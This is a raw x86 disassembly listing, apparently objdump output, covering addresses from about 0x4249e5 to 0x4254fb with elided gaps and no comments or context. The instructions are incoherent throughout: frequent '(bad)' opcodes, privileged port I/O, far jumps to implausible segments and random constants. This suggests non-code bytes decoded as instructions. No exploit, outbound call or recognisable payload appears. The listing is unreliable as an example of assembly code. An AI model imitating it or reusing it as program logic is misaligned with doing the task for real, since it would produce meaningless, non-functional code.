  4249e5:	mov    BYTE PTR [eax+0x547adf05],cl
  4249eb:	sbb    DWORD PTR ds:0x45,ebp
	...
  424a55:	add    BYTE PTR [ebx+0x18],ch
  424a58:	arpl   WORD PTR [edx+0x73],bp
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    bl,BYTE PTR [edi+ecx*4]
  424a64:	dec    edi
  424a65:	call   0x100:0x18967
  424a6c:	add    BYTE PTR [eax],al
  424a6e:	cmp    esp,DWORD PTR [edi-0x62]
  424a71:	add    dl,BYTE PTR [edx-0x22]
  424a74:	adc    DWORD PTR [eax+0x7048ef68],0x4507a134
  424a7e:	fist   WORD PTR [edx+0x65235453]
  424a84:	jmp    0x22c20b54
  424a89:	pop    ebx
  424a8a:	lds    eax,FWORD PTR [eax+0x7c]
  424a8d:	lods   al,BYTE PTR ds:[esi]
  424a8e:	dec    esp
  424a8f:	bound  esi,QWORD PTR [edi+0x49516a75]
  424a95:	sbb    cl,BYTE PTR [ebx-0x20]
  424a98:	(bad)  
  424a99:	iret   
  424a9a:	rol    BYTE PTR [edx-0x6],0xb7
  424a9e:	lock mov DWORD PTR [edx+0x26],ebx
  424aa2:	or     ecx,DWORD PTR [ecx]
  424aa4:	dec    ecx
  424aa5:	push   es
  424aa6:	xchg   edi,eax
  424aa7:	aam    0xc5
  424aa9:	add    eax,0x6365d9d2
  424aae:	mov    edx,0xa1533452
  424ab3:	dec    ebx
  424ab4:	in     al,0x53
  424ab6:	jmp    0x4317f04b
  424abb:	mov    cl,0x66
  424abd:	add    DWORD PTR [edx+0x78],ecx
  424ac0:	mov    ebp,0xb304760b
  424ac5:	sub    BYTE PTR [esi-0x11],al
  424ac8:	ins    BYTE PTR es:[edi],dx
  424ac9:	inc    edi
  424aca:	mov    eax,ds:0xffc58c5c
  424acf:	gs and eax,0x28d598f6
  424ad5:	or     ebp,DWORD PTR [eax+0x3b55bbc4]
  424adb:	xor    edx,ecx
  424add:	jmp    0x424b12
  424adf:	shl    dh,1
  424ae1:	jne    0x424b55
  424ae3:	(bad)  
  424ae5:	jg     0x424b14
  424ae7:	ds mov bl,0x72
  424aea:	repnz ss xchg ecx,eax
  424aed:	or     DWORD PTR [eax+0xd],edx
  424af0:	repz mov al,ds:0x230cf356
  424af6:	out    0x27,eax
  424af8:	cmp    eax,0x796fdcc2
  424afd:	add    DWORD PTR [esi],0xffffffa9
  424b00:	pop    ss
  424b01:	sub    eax,0x45c7da00
  424b06:	jnp    0x424b74
  424b08:	gs pop edx
  424b0a:	inc    ebp
  424b0b:	out    dx,eax
  424b0c:	mov    cs,WORD PTR [ebx+edx*4+0x72]
  424b10:	imul   edi,esi,0xffffff87
  424b13:	test   DWORD PTR [edi+0x4ea0261f],eax
  424b19:	xchg   edx,eax
  424b1a:	div    edx
  424b1c:	je     0x424b0e
  424b1e:	cmp    esp,DWORD PTR [ecx]
  424b20:	leave  
  424b21:	pop    ebp
  424b22:	lock jl 0x424b51
  424b25:	mov    al,ds:0x273f9804
  424b2a:	pop    eax
  424b2b:	xchg   ecx,eax
  424b2c:	sub    al,0xea
  424b2e:	pop    edi
  424b2f:	inc    ebx
  424b30:	(bad)
  424b34:	push   cs
  424b35:	sub    ebx,ecx
  424b37:	clc    
  424b38:	or     eax,0x27668c8e
  424b3d:	inc    ebp
  424b3e:	pop    eax
  424b3f:	and    DWORD PTR [ecx+0x7b],ebx
  424b42:	mov    eax,0x5d3466
  424b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b48:	sbb    DWORD PTR [ebp+0xb609c6c],eax
  424b4e:	jge    0x424b62
  424b50:	dec    edx
  424b51:	arpl   ax,sp
  424b53:	xchg   ebx,eax
  424b55:	pop    eax
  424b56:	dec    esi
  424b57:	jns    0x424b7a
  424b59:	addr16 fwait
  424b5b:	pusha  
  424b5c:	fisubr WORD PTR [eax+0x30]
  424b5f:	stos   DWORD PTR es:[edi],eax
  424b60:	add    al,0x2b
  424b62:	fild   DWORD PTR [esi+eiz*2+0x68]
  424b66:	aad    0xe4
  424b68:	retf   
  424b69:	sti    
  424b6a:	cmp    esi,ebp
  424b6c:	mov    BYTE PTR [ebx+0x0],ch
	...
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	gs pop esp
  424be4:	enter  0x6739,0x8a
  424be8:	add    DWORD PTR [eax],eax
  424bea:	add    BYTE PTR [ecx],al
  424bec:	add    BYTE PTR [eax],al
  424bee:	out    dx,eax
  424bef:	sub    DWORD PTR [ebp-0x1],edi
  424bf2:	out    0xa1,eax
  424bf4:	jl     0x424c2f
  424bf6:	lods   al,BYTE PTR ds:[esi]
  424bf7:	es xor al,dl
  424bfa:	gs pushf 
  424bfc:	xchg   ebp,eax
  424bfd:	test   eax,0x49ed1bb9
  424c02:	fstp   TBYTE PTR [ebp-0xa]
  424c05:	fwait
  424c06:	out    0xd7,al
  424c08:	inc    ecx
  424c09:	int    0xd2
  424c0b:	jge    0x424c47
  424c0d:	mov    es,WORD PTR [edi+0x215f3070]
  424c13:	and    eax,0x5956e5a7
  424c18:	fadd   QWORD PTR [esp+esi*4+0x28dac472]
  424c1f:	retf   0xe163
  424c22:	arpl   bp,cx
  424c24:	sub    DWORD PTR [edx-0x7],esi
  424c27:	pop    es
  424c28:	cld    
  424c29:	fsubr  QWORD PTR [ebx]
  424c2b:	mov    eax,ds:0x8961b6dd
  424c30:	jmp    0xbeab3812
  424c35:	out    dx,al
  424c36:	or     esp,ebp
  424c38:	ins    BYTE PTR es:[edi],dx
  424c39:	mov    esi,0x187776c8
  424c3e:	jne    0x424c29
  424c40:	xchg   edx,eax
  424c41:	cmc    
  424c42:	loopne 0x424ca1
  424c44:	cmp    eax,0x728f409f
  424c49:	test   DWORD PTR [ebx],edx
  424c4b:	mov    di,0x1695
  424c4f:	dec    eax
  424c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c51:	mov    ah,0xb4
  424c53:	cmp    BYTE PTR [ecx],ch
  424c55:	in     eax,0xe0
  424c57:	push   esp
  424c58:	gs (bad) 
  424c5a:	xchg   esi,eax
  424c5b:	pop    edi
  424c5c:	jo     0x424c49
  424c5e:	jno    0x424c85
  424c60:	jae    0x424c14
  424c62:	push   eax
  424c63:	pop    edi
  424c64:	xor    DWORD PTR [esi+0x15c3081f],ebp
  424c6a:	sub    eax,0x2d30d363
  424c6f:	inc    ecx
  424c70:	hlt    
  424c71:	inc    ecx
  424c72:	outs   dx,DWORD PTR ds:[esi]
  424c73:	and    eax,0x7e4d77ee
  424c78:	push   cs
  424c79:	test   BYTE PTR [eax+0x57c0a18f],ah
  424c7f:	jl     0x424cc6
  424c81:	fs retf 
  424c83:	sbb    al,0x3c
  424c85:	retf   
  424c86:	int3   
  424c87:	mov    ds:0x42da05,eax
  424c8c:	es out dx,eax
  424c8e:	mov    ds:0x4461fdcc,eax
  424c93:	shl    DWORD PTR [edx],1
  424c95:	and    BYTE PTR [edi-0x6da9ce6a],dh
  424c9b:	mov    ah,0x9c
  424c9d:	imul   edi,esi,0xfffffff3
  424ca0:	or     edx,DWORD PTR [edi-0x46e654f9]
  424ca6:	fwait
  424ca7:	inc    ecx
  424ca8:	jae    0x424cd7
  424caa:	add    cl,bl
  424cac:	or     al,0xf
  424cae:	cwde   
  424caf:	arpl   WORD PTR ds:0xaf30d8f6,si
  424cb5:	sbb    al,0x32
  424cb7:	add    al,BYTE PTR [esp+ebx*8-0x6c88c719]
  424cbe:	fmul   QWORD PTR [ecx]
  424cc0:	mov    edx,0x49550cf1
  424cc5:	nop
  424cc6:	sub    BYTE PTR [edx],cl
  424cc8:	enter  0xbe9e,0x41
  424ccc:	or     eax,0x9ef3d70a
  424cd1:	sti    
  424cd2:	and    dh,dl
  424cd4:	jo     0x424c91
  424cd6:	fs dec eax
  424cd8:	jecxz  0x424c87
  424cda:	scas   al,BYTE PTR es:[edi]
  424cdb:	lods   al,BYTE PTR ds:[esi]
  424cdc:	push   edi
  424cdd:	adc    eax,0x5ceeb3af
  424ce2:	mov    edx,0xc27b2ba2
  424ce7:	sub    BYTE PTR [edi-0x5e338170],0xa6
	...
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx-0x3bc3ae58]
  424d64:	(bad)
  424d67:	mov    eax,DWORD PTR [ecx]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    BYTE PTR [eax-0x64],dl
  424d70:	cdq    
  424d71:	cmp    al,0x74
  424d73:	imul   ebx,edx,0x850b4b2d
  424d79:	xor    eax,0x11d52bfd
  424d7e:	sbb    edi,ebp
  424d80:	std    
  424d81:	ret    0xc3dd
  424d84:	hlt    
  424d85:	pop    edi
  424d86:	stos   DWORD PTR es:[edi],eax
  424d87:	fcos   
  424d89:	xchg   esp,ecx
  424d8b:	sub    al,0x20
  424d8d:	cdq    
  424d8e:	shr    BYTE PTR [ecx],0xbd
  424d91:	sub    DWORD PTR [edi],ebp
  424d93:	lods   al,BYTE PTR ds:[esi]
  424d94:	pop    eax
  424d95:	pop    esi
  424d96:	test   al,0xf3
  424d98:	push   esi
  424d99:	test   BYTE PTR [edx],bh
  424d9b:	lea    edx,[edx]
  424d9d:	push   ds
  424d9e:	out    dx,eax
  424d9f:	xchg   edx,eax
  424da0:	(bad)  
  424da1:	xchg   ebx,eax
  424da2:	je     0x424d85
  424da4:	enter  0x518a,0x65
  424da8:	not    DWORD PTR [edi]
  424daa:	lock or esp,DWORD PTR [eax]
  424dad:	mov    ah,BYTE PTR [eax+eax*2]
  424db0:	sbb    al,0xdc
  424db2:	repz jl 0x424d49
  424db5:	cld    
  424db6:	inc    DWORD PTR [edi]
  424db8:	daa    
  424db9:	adc    al,0x11
  424dbb:	cmp    BYTE PTR [esi-0x3e],bh
  424dbe:	repnz inc ecx
  424dc0:	push   ecx
  424dc1:	std    
  424dc2:	push   es
  424dc3:	(bad)  
  424dc4:	int3   
  424dc5:	and    DWORD PTR [ebp+0x133a4ed6],eax
  424dcb:	lods   al,BYTE PTR ds:[esi]
  424dcc:	pop    eax
  424dcd:	or     bl,al
  424dcf:	mov    ds:0xe791eb81,eax
  424dd4:	and    esp,esp
  424dd6:	imul   ecx,DWORD PTR [edi],0xc79e6b3d
  424ddc:	adc    ah,BYTE PTR [esi+0x6]
  424ddf:	jecxz  0x424dcb
  424de1:	push   esi
  424de2:	sahf   
  424de3:	vmread DWORD PTR [ebx+0x6ba77bce],eax
  424dea:	mov    bl,0x4a
  424dec:	mov    edx,0xbf324e66
  424df1:	fidivr WORD PTR [eax+0x7c]
  424df4:	leave  
  424df5:	fimul  DWORD PTR [edi+0x6]
  424df8:	cld    
  424df9:	push   ebp
  424dfa:	(bad)  
  424dfb:	cld    
  424dfc:	pop    eax
  424dfd:	and    esi,edx
  424dff:	fiadd  DWORD PTR [esi]
  424e01:	sub    ecx,edx
  424e03:	jl     0x424dbb
  424e05:	inc    edx
  424e06:	mov    ebx,0xd1bfd66b
  424e0b:	or     bh,BYTE PTR [esi]
  424e0d:	enter  0xefa2,0xb8
  424e11:	lock mov ecx,0x3fc5e543
  424e17:	aas    
  424e18:	cmp    al,0x2a
  424e1a:	sub    BYTE PTR [esi-0x3d],bh
  424e1d:	push   es
  424e1e:	(bad)  
  424e20:	daa    
  424e21:	inc    ecx
  424e22:	sub    dl,BYTE PTR ds:0x27fe46dc
  424e28:	or     BYTE PTR ds:0xb2f623c9,al
  424e2f:	jns    0x424df4
  424e31:	cli    
  424e32:	adc    esi,DWORD PTR [ebx+0xe62c684]
  424e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e39:	outs   dx,BYTE PTR ds:[esi]
  424e3a:	push   0x3
  424e3c:	imul   DWORD PTR [ebx+0x5a58b810]
  424e42:	mov    al,ds:0x37d9383c
  424e47:	push   eax
  424e48:	mov    ds:0x4060d4bb,al
  424e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e4e:	js     0x424e18
  424e50:	call   0xbba46f62
  424e55:	cmp    BYTE PTR [ebx-0x23],ah
  424e58:	xor    DWORD PTR [ebp+0x1357c09a],edx
  424e5e:	fild   WORD PTR [esi]
  424e60:	mov    esi,DWORD PTR [ecx+0x5b]
  424e63:	pop    ds
  424e64:	dec    esp
  424e65:	sub    dh,BYTE PTR [edi]
  424e67:	test   BYTE PTR [edx+0x427da3d1],0xbd
	...
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424f58
  424ee3:	or     al,BYTE PTR [ebp+0x18c670b]
  424ee9:	add    BYTE PTR [eax],al
  424eeb:	add    DWORD PTR [eax],eax
  424eed:	add    BYTE PTR [edi+eiz*2],ah
  424ef0:	sub    eax,0xdb0a59da
  424ef5:	mov    ds:0x82288645,al
  424efa:	inc    ebx
  424efb:	jbe    0x424f18
  424efd:	ds mov ch,0x81
  424f00:	adc    BYTE PTR [ebx+0x16a11749],0xca
  424f07:	dec    edx
  424f08:	in     eax,0x5e
  424f0a:	and    al,0x33
  424f0c:	fist   DWORD PTR [ecx+eax*8+0x28e294c8]
  424f13:	jmp    0xd439:0x80263939
  424f1a:	aad    0x7a
  424f1c:	inc    ecx
  424f1d:	jnp    0x424f69
  424f1f:	hlt    
  424f20:	gs pop ebp
  424f22:	sbb    al,BYTE PTR gs:[eax-0x50]
  424f26:	or     BYTE PTR [ebx],al
  424f28:	mov    eax,0x7b14b73c
  424f2d:	scas   eax,DWORD PTR es:[edi]
  424f2e:	aas    
  424f2f:	jge    0x424ef0
  424f31:	pop    eax
  424f32:	xchg   esi,eax
  424f33:	sbb    eax,0x19ee8b64
  424f38:	int    0x6e
  424f3a:	inc    ebp
  424f3b:	jmp    0xb8d2:0x5200425f
  424f42:	mov    edi,DWORD PTR [eax]
  424f44:	mov    dh,0xa7
  424f46:	shr    BYTE PTR [esi+0x6923034f],1
  424f4c:	test   al,cl
  424f4e:	loop   0x424fc1
  424f50:	sbb    DWORD PTR [esi],0x9cf3308f
  424f56:	pushf  
  424f57:	sub    eax,0x5edef955
  424f5c:	stos   DWORD PTR es:[edi],eax
  424f5d:	add    esp,eax
  424f5f:	mov    es,WORD PTR [edx+0x614dcb3c]
  424f65:	jbe    0x424fb6
  424f67:	sub    BYTE PTR [esi-0x6e07dbd4],ah
  424f6d:	out    dx,eax
  424f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f70:	xchg   edi,eax
  424f71:	xor    edx,DWORD PTR [edx+0x55]
  424f74:	js     0x424f6c
  424f76:	jne    0x424f2e
  424f78:	xchg   BYTE PTR [ebx],bh
  424f7a:	add    al,0xb8
  424f7c:	and    al,0x68
  424f7e:	std    
  424f7f:	xor    al,0x86
  424f81:	mov    esi,0xb2e42660
  424f86:	push   ebp
  424f87:	outs   dx,DWORD PTR ds:[esi]
  424f88:	loope  0x424f32
  424f8a:	and    al,0xbf
  424f8c:	or     bh,BYTE PTR [ecx+0xdb6aeca]
  424f92:	jne    0x424fe7
  424f94:	jns    0x424f67
  424f96:	xor    DWORD PTR [ebx-0x53],esp
  424f99:	add    al,0x97
  424f9b:	scas   al,BYTE PTR es:[edi]
  424f9c:	cmp    al,BYTE PTR cs:[esi-0x5a8baca0]
  424fa3:	retf   
  424fa4:	outs   dx,BYTE PTR ds:[esi]
  424fa5:	and    dl,BYTE PTR [ecx-0x6]
  424fa8:	mov    es,WORD PTR [eax]
  424faa:	(bad)  
  424fac:	ss sbb eax,0xcb488b83
  424fb2:	add    BYTE PTR ds:0x429419cd,bh
  424fb8:	sub    al,BYTE PTR [edi]
  424fba:	gs loop 0x425002
  424fbd:	pop    ebx
  424fbe:	cmovnp edi,DWORD PTR [ecx]
  424fc1:	cmc    
  424fc2:	(bad)  
  424fc3:	cmp    eax,0x1a598556
  424fc8:	jne    0x424f4c
  424fca:	int    0xa1
  424fcc:	sbb    bh,BYTE PTR [ebx+0x5f]
  424fcf:	jl     0x425036
  424fd1:	shl    ecx,0x7a
  424fd4:	add    al,0xdf
  424fd6:	cmp    BYTE PTR [ebp+ebp*8+0x5cd75ac9],al
  424fdd:	sub    eax,0x94db347b
  424fe2:	jl     0x425011
  424fe4:	push   esi
  424fe5:	and    DWORD PTR [eax+0x49],eax
  424fe8:	xor    BYTE PTR [edx+edx*8+0x69f2a0],al
	...
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	arpl   WORD PTR [ecx],cx
  425064:	fadd   st(6),st
  425066:	lea    eax,[bx+di]
  425069:	add    BYTE PTR [eax],al
  42506b:	add    DWORD PTR [eax],eax
  42506d:	add    BYTE PTR [edx-0x22],dh
  425070:	push   cs
  425071:	push   ebp
  425072:	pop    edi
  425073:	rcr    DWORD PTR [ebp+0x6b],cl
  425076:	adc    dl,bl
  425078:	lea    ebp,[edi]
  42507a:	adc    DWORD PTR ds:0xccc082c2,esi
  425080:	add    eax,DWORD PTR [edi+eax*2+0x6389a7c3]
  425087:	xchg   ebp,eax
  425088:	adc    al,0x4f
  42508a:	cmp    al,0xdf
  42508c:	fbld   TBYTE PTR [ebx]
  42508e:	pop    dx
  425090:	mov    ebp,DWORD PTR [edx+edx*4]
  425093:	iret   
  425094:	pop    DWORD PTR ds:0xdecda297
  42509a:	cmc    
  42509b:	fwait
  42509c:	push   edi
  42509d:	imul   ecx,ecx,0x3f
  4250a0:	out    dx,al
  4250a1:	add    esp,DWORD PTR [ecx]
  4250a3:	jo     0x425092
  4250a5:	add    ecx,DWORD PTR [esi-0x6d]
  4250a8:	rdtsc  
  4250aa:	das    
  4250ab:	and    bl,0x53
  4250ae:	pop    esi
  4250af:	retf   
  4250b0:	in     eax,0xbb
  4250b2:	or     eax,0x4792f47d
  4250b7:	mov    ah,0x7e
  4250b9:	popf   
  4250ba:	shr    esp,cl
  4250bc:	test   ebx,eax
  4250be:	and    BYTE PTR [edx-0x68],bl
  4250c1:	pop    ecx
  4250c2:	push   cs
  4250c3:	outs   dx,DWORD PTR ds:[esi]
  4250c4:	mov    ch,0x4d
  4250c6:	inc    ebx
  4250c7:	ror    esi,0x90
  4250ca:	jne    0x42509e
  4250cc:	sbb    dh,BYTE PTR [edi-0x62]
  4250cf:	popa   
  4250d0:	dec    edx
  4250d1:	shl    BYTE PTR ds:0x3cd72aef,0xc9
  4250d8:	and    edi,ebp
  4250da:	es enter 0x6cad,0xf4
  4250df:	and    DWORD PTR [ecx+0x7e9856a7],edi
  4250e5:	mov    WORD PTR ds:0x57339d8c,gs
  4250eb:	das    
  4250ec:	mov    ebp,DWORD PTR [esi-0x5c9e91cb]
  4250f2:	ins    DWORD PTR es:[edi],dx
  4250f3:	dec    ecx
  4250f4:	jmp    0xaa55:0xb549fb3
  4250fb:	sbb    eax,DWORD PTR [esi+0x28]
  4250fe:	xchg   BYTE PTR [edi-0x41028b14],bh
  425104:	shl    BYTE PTR [edx],1
  425106:	xchg   edi,eax
  425107:	cs push cs
  425109:	ins    BYTE PTR es:[edi],dx
  42510a:	fbld   TBYTE PTR [edi-0x9]
  42510d:	aas    
  42510e:	mov    bh,0x5f
  425110:	mov    ah,0x5
  425112:	jbe    0x425127
  425114:	mov    edi,0x526bd06e
  425119:	bound  eax,QWORD PTR [edi+0x144cc19]
  42511f:	pop    edi
  425120:	cmp    DWORD PTR [ebp-0x6b86708f],eax
  425126:	xlat   BYTE PTR ds:[ebx]
  425127:	ds mov edi,0xbcffde62
  42512d:	mov    bh,0xc7
  42512f:	cli    
  425130:	cwde   
  425131:	in     al,0xa7
  425133:	cmp    esi,ecx
  425135:	mov    ch,0x20
  425137:	inc    ebp
  425138:	push   ds
  425139:	jb     0x42514b
  42513b:	push   cs
  42513c:	ret    
  42513d:	mov    bh,0x36
  42513f:	xlat   BYTE PTR ds:[ebx]
  425140:	push   cs
  425141:	in     al,dx
  425142:	sub    esi,esp
  425144:	imul   BYTE PTR [eax+0x28]
  425147:	xchg   esi,eax
  425148:	(bad)  
  425149:	mov    ebx,0x22cd9bc9
  42514e:	aam    0x1f
  425150:	inc    edi
  425151:	retf   
  425152:	lods   eax,DWORD PTR ds:[esi]
  425153:	addr16 jmp 0x4250fc
  425156:	dec    esi
  425157:	mov    edx,0x26ae6616
  42515c:	mov    BYTE PTR [edx+ecx*4+0x7880601f],bh
  425163:	jmp    0xfe41:0x44c259d9
  42516a:	sub    edx,DWORD PTR [eax-0x38]
  42516d:	fwait
	...
  4251d6:	ficom  WORD PTR [ecx]
  4251d8:	lahf   
  4251d9:	and    ebx,edi
  4251db:	scas   eax,DWORD PTR es:[edi]
  4251dc:	(bad)  
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0xe9c8:0xcf3492e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    ch,bl
  4251ef:	pop    es
  4251f0:	call   0x16f4:0x6da19e1c
  4251f7:	fadd   QWORD PTR [eax+edi*8+0x10]
  4251fb:	retf   0xa9f3
  4251fe:	mov    edx,0xe6068f44
  425203:	or     DWORD PTR [ecx+0x71],esi
  425206:	les    ecx,FWORD PTR [ebx]
  425208:	sahf   
  425209:	js     0x42521c
  42520b:	mov    dl,0x8f
  42520d:	pop    edi
  42520e:	retf   0xa5f8
  425211:	sub    eax,0x92c7e62b
  425216:	lods   eax,DWORD PTR ds:[si]
  425218:	fcom   st(2)
  42521a:	xchg   esi,eax
  42521b:	jbe    0x425240
  42521d:	iret   
  42521e:	mov    al,ds:0x421e55d5
  425223:	or     ebx,DWORD PTR [edi+ebx*8+0x5a]
  425227:	push   0x4dcb5061
  42522c:	adc    DWORD PTR [esi-0x56eb04b9],ecx
  425232:	cs scas al,BYTE PTR es:[edi]
  425234:	and    BYTE PTR [eax+0x3f0bb27],ch
  42523a:	sbb    DWORD PTR [eax],0x2df93b9f
  425240:	mul    BYTE PTR [edi]
  425242:	cmp    ch,BYTE PTR [edx]
  425244:	js     0x4251c7
  425246:	mov    BYTE PTR [edx+0x50],dh
  425249:	mov    bl,0x5e
  42524b:	iret   
  42524c:	fcom   DWORD PTR [edi-0x2e]
  42524f:	inc    ecx
  425250:	or     BYTE PTR [ebp-0x40],ch
  425253:	cmp    dl,BYTE PTR [ecx]
  425255:	and    eax,0x9d8d2409
  42525a:	add    dh,BYTE PTR [ebx-0x5e]
  42525d:	gs out dx,eax
  42525f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425260:	jl     0x4252ba
  425262:	sahf   
  425263:	std    
  425264:	setnp  BYTE PTR [ebx+eax*4]
  425268:	mov    eax,0xa0f6d4a1
  42526d:	push   DWORD PTR [ebx+0x474c7503]
  425273:	sub    DWORD PTR [edx-0x60b1e47c],esp
  425279:	icebp  
  42527a:	fisttp WORD PTR [eax]
  42527c:	mov    ds:0x7fbaf775,eax
  425281:	retf   0x665c
  425284:	out    0x47,eax
  425286:	xchg   edi,eax
  425287:	jns    0x4252b8
  425289:	inc    edx
  42528a:	cmp    eax,0x33ba0dbb
  42528f:	sbb    DWORD PTR ss:[ebx],edi
  425292:	call   0xf2248a86
  425297:	fs pop ds
  425299:	and    al,0xa7
  42529b:	cmc    
  42529c:	daa    
  42529d:	jp     0x42525f
  42529f:	xchg   ah,bh
  4252a1:	sahf   
  4252a2:	mov    eax,DWORD PTR [ecx]
  4252a4:	push   edi
  4252a5:	or     BYTE PTR [ecx-0x47fc887f],0x4b
  4252ac:	fcmovnbe st,st(4)
  4252ae:	or     DWORD PTR ds:0x83015bcf,ebx
  4252b4:	clc    
  4252b5:	inc    edi
  4252b6:	sub    al,0x1d
  4252b8:	popa   
  4252b9:	or     esi,DWORD PTR [esi]
  4252bb:	ret    
  4252bc:	ins    DWORD PTR es:[edi],dx
  4252bd:	sbb    edx,eax
  4252bf:	std    
  4252c0:	jmp    0x42528b
  4252c2:	jae    0x4252ce
  4252c4:	mov    bl,0x1c
  4252c6:	and    DWORD PTR [ebx-0x7b],ebx
  4252c9:	aas    
  4252ca:	lea    ebp,[edi+0x56fdc324]
  4252d0:	add    eax,DWORD PTR [ebx-0x3a]
  4252d3:	push   ebx
  4252d4:	fwait
  4252d5:	sar    BYTE PTR [esi+0x55],0x4b
  4252d9:	pusha  
  4252da:	or     al,0x2a
  4252dc:	mov    ds:0x2dcdd68a,eax
  4252e1:	test   bh,0x2d
  4252e4:	lahf   
  4252e5:	aas    
  4252e6:	dec    edx
  4252e7:	enter  0x6c3b,0xea
  4252eb:	shl    DWORD PTR [edi+0x51],0x0
	...
  425353:	add    BYTE PTR [eax],al
  425355:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	fsubr  DWORD PTR [ebx-0x7098838b]
  425368:	add    DWORD PTR [eax],eax
  42536a:	add    BYTE PTR [ecx],al
  42536c:	add    BYTE PTR [eax],al
  42536e:	cs dec eax
  425370:	jnp    0x425302
  425372:	(bad)  
  425374:	push   edi
  425375:	loop   0x4253c4
  425377:	hlt    
  425378:	mov    DWORD PTR [edi-0x4c],esp
  42537b:	mov    ebp,DWORD PTR [esi]
  42537d:	clc    
  42537e:	jns    0x4253c9
  425380:	pop    ss
  425381:	pop    edx
  425382:	jno    0x425319
  425384:	xchg   BYTE PTR [edx],al
  425386:	jmp    0x425322
  425388:	add    eax,0xf40c13ce
  42538d:	(bad)  
  42538f:	cli    
  425390:	inc    esi
  425391:	hlt    
  425392:	mov    ebx,0xb94f1fbe
  425397:	pushf  
  425398:	or     eax,0xc5639118
  42539d:	cmp    al,BYTE PTR [ecx]
  42539f:	loop   0x425359
  4253a1:	dec    esi
  4253a2:	pop    ebp
  4253a3:	popa   
  4253a4:	pop    ds
  4253a5:	ror    BYTE PTR [ebx+0x4c2c4ac4],1
  4253ab:	(bad)  
  4253ac:	pushf  
  4253ad:	push   edi
  4253ae:	inc    ebx
  4253af:	cmp    eax,0x2be08f51
  4253b4:	jmp    0x94acadc3
  4253b9:	gs jge 0x425374
  4253bc:	addr16 mov ecx,0xd736534f
  4253c2:	fmul   DWORD PTR [ebp-0x32a4032b]
  4253c8:	jns    0x425390
  4253ca:	pusha  
  4253cb:	xchg   DWORD PTR [edx+0x60572028],ebx
  4253d1:	push   ds
  4253d2:	dec    edx
  4253d3:	mov    ecx,0x4024ad6
  4253d8:	pop    ecx
  4253d9:	dec    edi
  4253da:	push   ss
  4253db:	imul   ebx,DWORD PTR [ecx],0x27732128
  4253e1:	ins    BYTE PTR es:[edi],dx
  4253e2:	pop    eax
  4253e3:	xchg   ecx,eax
  4253e4:	out    0x9e,eax
  4253e6:	or     dh,dh
  4253e8:	push   0x75
  4253ea:	into   
  4253eb:	or     DWORD PTR [ecx+eax*4],0xffffffb1
  4253ef:	cli    
  4253f0:	ins    DWORD PTR es:[edi],dx
  4253f1:	inc    ebx
  4253f2:	pop    ebx
  4253f3:	sbb    edx,eax
  4253f5:	adc    al,0x4
  4253f7:	fwait
  4253f8:	rol    DWORD PTR [edi+0x5711e05d],1
  4253fe:	fxch   st(1)
  425400:	fist   WORD PTR [ebp-0x67]
  425403:	fsubr  QWORD PTR [edi-0x217957d2]
  425409:	lock popf 
  42540b:	pop    ecx
  42540c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42540d:	or     DWORD PTR [edi+0x39],ebx
  425410:	adc    eax,0x328735fa
  425415:	inc    edi
  425416:	out    0x7,al
  425418:	(bad)  
  425419:	(bad)  
  42541a:	es mov ecx,0xab8fdd7f
  425420:	shl    bh,0x35
  425423:	out    dx,al
  425424:	xchg   esp,eax
  425425:	jo     0x42545f
  425427:	ds inc edi
  425429:	xor    eax,0x70342172
  42542e:	add    al,0xe4
  425430:	mov    bh,BYTE PTR [eax-0x5d195d68]
  425436:	mov    esp,0x40c47b29
  42543b:	pushf  
  42543c:	in     eax,dx
  42543d:	icebp  
  42543e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42543f:	jbe    0x425417
  425441:	mov    dh,0xc5
  425443:	jmp    0x42548d
  425445:	and    esi,DWORD PTR [edx+0x568b976b]
  42544b:	mov    ebp,0xa2de746a
  425450:	std    
  425451:	popa   
  425452:	das    
  425453:	pop    ds
  425454:	pop    ss
  425455:	inc    edi
  425456:	pop    eax
  425457:	cmp    BYTE PTR [edx+0x408708df],bh
  42545d:	pop    ecx
  42545e:	adc    al,0x54
  425460:	inc    ebx
  425461:	test   eax,0x5a166f0d
  425466:	sub    esi,DWORD PTR [esi-0x25]
  425469:	adc    eax,0x84db4eed
	...
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    esi,DWORD PTR [ecx+0x15]
  4254e4:	jne    0x42554f
  4254e6:	addr16 nop
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	clc    
  4254ef:	adc    ecx,DWORD PTR [ebx+0x6c0fc5b6]
  4254f5:	loopne 0x425524
  4254f7:	js     0x4254f6
  4254f9:	loopne 0x425578
  4254fb:	inc    ebp
